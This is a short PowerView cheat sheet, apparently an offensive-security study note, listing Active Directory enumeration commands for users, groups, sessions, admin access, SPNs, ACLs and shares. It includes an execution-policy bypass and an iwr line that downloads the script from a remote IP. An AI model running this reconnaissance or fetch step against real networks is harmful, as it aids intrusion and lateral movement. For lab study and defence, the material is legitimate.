# PowerView

PowerView is a powerful powershell script that can be imported as a module. It uses a range of inbuilt .NET classes to query the domain for information and return it.

Documentation:

[https://powersploit.readthedocs.io/en/latest/Recon/](https://powersploit.readthedocs.io/en/latest/Recon/)

Useful Flags:

- -Verbose

Import:

powershell -ep bypass

iwr -uri [http://192.168.45.154:8000/powerview.ps1](http://192.168.45.154:8000/powerview.ps1) -Outfile powerview.ps1

Import-Module .\PowerView.ps1

### Enumerating Domain

- Get-NetDomain

### Enumerating Users

- Get-NetUser
- Get-NetUser <username>
- Get-NetUser | select <attribute>,<attribute>,<attribute>

### Enumerating Groups

- Get-NetGroup
- Get-NetGroup <groupname>
- Get-NetGroup | select <attribute>,<attribute>,<attribute>
- Get-NetGroup | Where-Object { $_.member -like "<user>*" } | Select-Object cn, member - show all groups member is a apart of.

### Enumerating Computer Information

- Get-NetComputer
- Get-NetComputer | select dnshostname,<attribute>

### Understanding Privileges

- Find-LocalAdminAccess - attempts to find any computer that the current user has administrative privileges on.
- Get-NetSession -ComputerName <computername> - attempts identify which user is logged into what computer.
- .\PsLoggedon.exe [\\<computername>](file://%3ccomputername%3e) - enumerates who is logged into a computer.

### Service Accounts

- Get-NetUser -SPN | select samaccountname,serviceprincipalname

### Enumerating Object Permissions

- Get-ObjectAcl -Identity <users> - enumerates all objects that has an ACL entry for a particular user.
- Convert-SidToName <SID>
- Get-ObjectAcl -Identity "Backup Operators" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights - check if user has GeneralAll property this is the highest privilege within AD.
- Find-InterestingDomainAcl | select IdentityReferenceName,ActiveDirectoryRights,AceType,ObjectDN,SecurityIdentifier | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"}

### Enumerating Shares

- Find-DomainShare
- net view [\\<hostname/ip>](file://%3chostname/ip%3e)
- ls [\\<hostname>\<sharename>\](file://%3chostname%3e/%3csharename%3e/)
- cat [\\<hostname>\<sharename>\](file://%3chostname%3e/%3csharename%3e/)